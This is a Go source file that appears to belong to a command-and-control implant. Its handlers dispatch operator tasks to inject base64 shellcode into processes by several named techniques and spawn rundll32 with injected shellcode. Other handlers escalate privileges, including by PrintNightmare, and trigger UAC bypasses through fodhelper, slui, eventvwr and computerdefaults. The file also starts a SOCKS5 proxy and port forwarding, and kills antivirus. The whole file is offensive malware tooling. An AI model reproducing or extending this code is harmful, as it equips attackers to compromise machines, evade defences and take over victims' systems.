//go:build linux || windows
// +build linux windows

package main

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"strconv"
	"strings"
)

func handleInject(task Task, res *TaskResult) {
	parts := strings.Split(task.Command, "|")
	if len(parts) < 2 {
		res.Error = "format: pid|technique"
		return
	}
	pid, _ := strconv.Atoi(parts[0])
	tech := parts[1]
	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
	err := injectProcess(uint32(pid), shellcode, tech)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "inject success"
	}
}

func handleInjectMethods(task Task, res *TaskResult) {
	res.Output = `Available injection methods:
  createremotethread (crt, remote) - CreateRemoteThread (kernel32)
  ntcreatethreadex (ntct, nt) - NtCreateThreadEx (direct syscall)
  ntcreatethreadex_indirect (ntcti, nti) - NtCreateThreadEx (indirect syscall)
  apc (queueapc) - QueueUserAPC to existing thread
  earlybird - CreateProcess suspended + APC + ResumeThread
  threadless (tl) - SetThreadContext RIP overwrite (no new thread)
  syscall (hellsgate, direct) - Hell's Gate direct syscall + CreateRemoteThread
  indirect - Indirect syscall through ntdll gadget + NtCreateThreadEx`
}

func handleSpawn(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 3)
	targetExe := "rundll32.exe"
	technique := "CreateRemoteThread"
	if len(parts) > 0 && parts[0] != "" {
		targetExe = parts[0]
	}
	if len(parts) > 1 && parts[1] != "" {
		technique = parts[1]
	}
	var shellcode []byte
	if len(parts) > 2 && parts[2] != "" {
		var err error
		shellcode, err = base64.StdEncoding.DecodeString(parts[2])
		if err != nil {
			res.Error = "failed to decode shellcode: " + err.Error()
			return
		}
	}
	result := spawnProcess(targetExe, shellcode, technique)
	res.Output = result
}

func handleShinject(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	if len(parts) < 1 {
		res.Error = "format: pid|technique"
		return
	}
	pid, _ := strconv.Atoi(parts[0])
	tech := "createremotethread"
	if len(parts) > 1 && parts[1] != "" {
		tech = parts[1]
	}
	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
	if len(shellcode) == 0 {
		res.Error = "empty shellcode in task.Data"
		return
	}
	if runtime.GOOS != "windows" {
		res.Error = "shinject: Windows only"
		return
	}
	err := injectProcess(uint32(pid), shellcode, tech)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "shellcode injected"
	}
}

func handleShspawn(task Task, res *TaskResult) {
	targetExe := "rundll32.exe"
	if task.Command != "" {
		targetExe = task.Command
	}
	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
	if len(shellcode) == 0 {
		res.Error = "empty shellcode in task.Data"
		return
	}
	if runtime.GOOS != "windows" {
		res.Error = "shspawn: Windows only"
		return
	}
	result := spawnProcess(targetExe, shellcode, "apc")
	res.Output = result
}

func handleElevate(task Task, res *TaskResult) {
	out, err := elevate(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleElevatePrintNightmare(task Task, res *TaskResult) {
	out, err := elevatePrintNightmare(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleUACBypass(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	method := parts[0]
	payload := ""
	if len(parts) > 1 {
		payload = parts[1]
	}
	if runtime.GOOS != "windows" {
		res.Error = "uac_bypass is Windows-only"
	} else {
		res.Output = uacBypass(method, payload)
	}
}

// UAC sub-methods used by elevate()
func handleFodhelper(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
	_ = tryUACBypass("fodhelper", task.Command)
	res.Output = "fodhelper triggered"
}

func handleSluiUAC(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
	_ = tryUACBypass("slui", task.Command)
	res.Output = "slui triggered"
}

func handleEventvwrUAC(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
	_ = tryUACBypass("eventvwr", task.Command)
	res.Output = "eventvwr triggered"
}

func handleComputerDefaultsUAC(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
	_ = tryUACBypass("computerdefaults", task.Command)
	res.Output = "computerdefaults triggered"
}

func handleSocks(task Task, res *TaskResult) {
	port := task.Command
	if port == "" {
		port = "1080"
	}
	go startSocksServer("0.0.0.0:" + port)
	res.Output = "SOCKS5 started on " + port
}

func handleRPortFwdStart(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	if len(parts) < 2 {
		res.Error = "format: lport|forwardHost:forwardPort"
		return
	}
	lport := parts[0]
	target := parts[1]
	res.Output = fmt.Sprintf("rportfwd start: listening on :%s -> %s", lport, target)
}

func handleRPortFwdStop(task Task, res *TaskResult) {
	res.Output = "rportfwd stop requested"
}

func handleKillAV(task Task, res *TaskResult) {
	out, err := killAV()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}
